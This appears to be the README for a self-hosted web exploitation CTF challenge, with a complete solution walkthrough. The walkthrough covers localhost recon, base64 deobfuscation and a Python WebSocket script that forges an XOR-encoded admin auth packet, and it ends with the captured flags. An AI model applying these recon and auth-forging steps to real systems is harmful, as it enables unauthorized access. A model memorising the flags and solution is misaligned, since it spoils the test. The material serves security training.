# 🕵️ Shadow Sockets - Web Exploitation CTF Challenge
## **Author:** BlackMy7h

A realistic, multi-stage web security challenge that simulates infiltrating an abandoned cybercrime analytics dashboard. Players must navigate through honeypots, decode obfuscated protocols, and reconstruct split credentials to capture the flag.

---

## 📖 Table of Contents

- [Challenge Overview](#-challenge-overview)
- [Scenario](#-scenario)
- [Learning Objectives](#-learning-objectives)
- [Installation](#-installation)
- [Challenge Description](#-challenge-description-for-players)
- [Complete Solution](#-complete-solution-walkthrough)
- [Technical Details](#-technical-details)
- [Deployment](#-deployment-guide)
- [Customization](#-customization)

---

## 🎯 Challenge Overview

**Shadow Sockets** is a hard-difficulty web challenge that combines:
- Web reconnaissance and enumeration
- JavaScript deobfuscation
- Custom binary protocol analysis
- WebSocket communication
- XOR cipher cryptanalysis
- Multi-source secret reconstruction
- Honeypot detection

---

## 📜 Scenario

> *A recent data breach exposed internal communications from a cybercrime syndicate. Intelligence analysts discovered references to a metrics dashboard used to monitor their phishing infrastructure.*
>
> *The dashboard was hastily abandoned when law enforcement began investigating. *

## 🚀 Installation

### Prerequisites

- Python 3.8+
- pip
- Docker (optional)


### Docker Deployment

```bash
docker-compose up -d
```

---

## 🎮 Challenge Description (For Players)

```
TARGET: http://your-ctf-server:5000

INTELLIGENCE REPORT:
A data breach has exposed communications from the "Shadow Analytics" 
cybercrime group. We've identified their abandoned metrics dashboard.

MISSION OBJECTIVE:
Find an access entry that grants administrative access to 
their backend infrastructure.

HINTS:
- Look for leaked credentials and exposed configuration files
- Their real-time systems used custom protocols

FLAG FORMAT: NSC{...}
```

---

## 🔍 Complete Solution Walkthrough

### Stage 1: Initial Reconnaissance

#### Step 1: Explore the Dashboard

Visit `http://localhost:5000`


#### Step 2: Check robots.txt

```bash
curl http://localhost:5000/robots.txt
```

**Key Findings:**
```
User-agent: *
Disallow: /admin/
Disallow: /api/internal/
Disallow: /.git/
Disallow: /backup/
Disallow: /config/
```

#### Step 3: Test Endpoints

```bash
# Public API (works)
curl http://localhost:5000/api/status

# Exposed git (realistic misconfiguration)
curl http://localhost:5000/.git/config
```

---

### Stage 2: Honeypot Detection 

#### Step 4: Investigate Admin Panel

Visit `http://localhost:5000/admin`

**Result:** Terminal-style login that looks real, but trying credentials returns:

```json
{
  "flag": "NSC{brut3_f0rc3_w0nt_f1x_y0ur_sk1ll_1ssu3}"
}
```

**Conclusion:** This is a HONEYPOT. Ignore and move on!

---

### Stage 3: API Enumeration (20-30 min)

#### Step 5: Access Internal API

```bash
curl http://localhost:5000/api/internal/status
```

**Response:**
```json
{
  "archive_years": [
    "2023",
    "2024"
  ],
  "message": "Endpoint moved. Check archive for legacy configs.",
  "status": "deprecated",
  "websocket_path": "/stream/metrics"
}
```

**Key Intel:**
- WebSocket endpoint: `/stream/metrics`
- Protocol docs: `analytics-core.min.js`
- Archive to check: `2024-11`

---

### Stage 4: JavaScript Analysis 

#### Step 6: Download & Analyze JavaScript

```bash
curl http://localhost:5000/analytics-core.min.js -o analytics.js
cat analytics.js
```

**Key Variables:**
```javascript
var config = {
    ws: 'd3M6Ly9sb2NhbGhvc3Q6NTAwMC9zdHJlYW0vbWV0cmljcw==',
    magic: 'TUFHSUNfSEVBREVSOjB4NEQ1NDUyNEI=',
    protocol: 'UHJvdG9jb2xWZXJzaW9uOjF8WE9SX0tFWToweDcz',
    checksum: btoa('XOR_KEY_DECIMAL:115')
};
```

#### Step 7: Decode Base64 Strings

**Using bash:**
```bash
echo "d3M6Ly9sb2NhbGhvc3Q6NTAwMC9zdHJlYW0vbWV0cmljcw==" | base64 -d
# ws://localhost:5000/stream/metrics

echo "TUFHSUNfSEVBREVSOjB4NEQ1NDUyNEI=" | base64 -d
# MAGIC_HEADER:0x4D54524B

echo "UHJvdG9jb2xWZXJzaW9uOjF8WE9SX0tFWToweDcz" | base64 -d
# ProtocolVersion:1|XOR_KEY:0x73
```

**Using browser console:**
```javascript
atob('UHJvdG9jb2xWZXJzaW9uOjF8WE9SX0tFWToweDcz')
// "ProtocolVersion:1|XOR_KEY:0x73"
```

#### Step 8: Extract Protocol Details

```
WebSocket URL: ws://localhost:5000/stream/metrics
Magic Header: 0x4D54524B (ASCII: "MTRK")
Protocol Version: 0x0001
XOR Key: 0x73 (decimal: 115)
```

**Protocol Structure:**
```
[4 bytes: Magic] [2 bytes: Version] [N bytes: XOR-encrypted JSON]
```

---

### Stage 5: WebSocket Exploitation 

#### Step 9: Create WebSocket Client

Save as `ws_exploit.py`:


```python
import requests, websocket, struct, json, sys

# 1. Get the Session Cookie first (Critical!)
HOST = "localhost:5000"
sess = requests.Session()
sess.get(f"http://{HOST}/") # Visit home to generate cookie
cookie = sess.cookies.get("session")

# 2. Prepare Auth Packet (Magic + Version + XOR'd Admin Payload)
payload = json.dumps({"auth": "admin"}).encode()
encrypted = bytes([b ^ 0x73 for b in payload]) # XOR with 0x73
packet = struct.pack('>I', 0x4D54524B) + struct.pack('>H', 1) + encrypted

# 3. Connect & Authenticate (Passing the cookie)
ws = websocket.create_connection(f"ws://{HOST}/stream/metrics", cookie=f"session={cookie}")
ws.send(packet, opcode=websocket.ABNF.OPCODE_BINARY)

# 4. Print the Magic Command & Keep Open
print(f"\n[+] SESSION ESTABLISHED! Keep this running.\n")
print("-" * 50)
print("LIVE JSON STREAM:")

while True:
    try:
        print(ws.recv()) # Prints the JSON telemetry
    except:
        break
```

#### Step 10: Run WebSocket Client

```bash
pip install websocket-client
python ws_exploit.py
```

**Output:**
```json
{
  "legacy_systems": {
    "archive_location": "/api/internal/archive/2024-11",
    "access": "Requires active WebSocket session"
  },
  "hint": "Your WebSocket authentication unlocks archive access"
}
```

**CRITICAL:** The WebSocket connection sets `ws_authenticated = True` in your session!

---

### Stage 6: Archive Access (15-20 min)

#### Step 11: Access Archive (With Active Session!)

**Important:** Use the same browser/session that connected to WebSocket!

```bash
curl http://localhost:5000/api/internal/archive/2024-11 \
  --cookie "session=YOUR_SESSION_COOKIE"
```

**Response:**
```json
{
  "archived_configs": [
    {
      "bot_id": "bot_001",
      "config": {
        "deployed": "2024-11-03",
        "status": "active",
        "token_part_1": "mtrk_live_7f8a9b2c"
      }
    },
    {
      "bot_id": "bot_002",
      "config": {
        "deployed": "2024-11-08",
        "token_part_2": "d4e5f6a1"
      }
    },
    {
      "bot_id": "bot_003",
      "config": {
        "classification": "CONFIDENTIAL",
        "deployed": "2024-11-12",
        "token_part_3": "shadow_ops_backend_admin"
      }
    }
  ],
  "validation_endpoint": "/api/validate"
}
```

#### Step 12: Reconstruct Master Token


```
token_part_1: mtrk_live_7f8a9b2c
token_part_2: d4e5f6a1
token_part_3: shadow_ops_backend_admin

Master Token = mtrk_live_7f8a9b2c_d4e5f6a1_shadow_ops_backend_admin
```

---

### Stage 7: Token Validation (10-15 min)

#### Step 13: Submit Token

```bash
curl "http://localhost:5000/api/validate?token=mtrk_live_7f8a9b2c_d4e5f6a1_shadow_ops_backend_admin"
```

**Response:**
```json
{
  "flag": "NSC{T3rF_dy1_W3b50ck3t_S31B_fh4D_lw3Qt}",
  "message": "Identity Verified.",
  "user": "Delta_Killer",
  "valid": true
}
```

## 🎉 FLAG CAPTURED!

```
NSC{T3rF_dy1_W3b50ck3t_S31B_fh4D_lw3Qt}
```

---
When you want to unban everyone, open a new terminal on the server and run:

```bash
curl http://127.0.0.1:5000/admin/godmode/reset_bans
```

## 🛠️ Technical Details

### Architecture

```
Player → Flask App → Session Manager → WebSocket Handler → Flag
           ↓
      Rate Limiter
```

### Security Features

- **Rate Limiting:** 3-50 req/min depending on endpoint
- **Session Tracking:** WebSocket auth required for archive
- **Honeypots:** Fake admin panel with decoy flags
- **Anti-Automation:** Suspicious IP detection

### Tech Stack

- Flask 3.0.0
- flask-sock 0.7.0 (WebSocket)
- flask-limiter 3.5.0 (Rate limiting)
- Custom binary protocol (MTRK)
- XOR cipher (educational)

---

## 📦 Deployment Guide

### Development

```bash
python3 app.py
```

### Production (Docker)

```bash
docker-compose up -d
```

---

## 📄 License

BlackMy7h

---

---
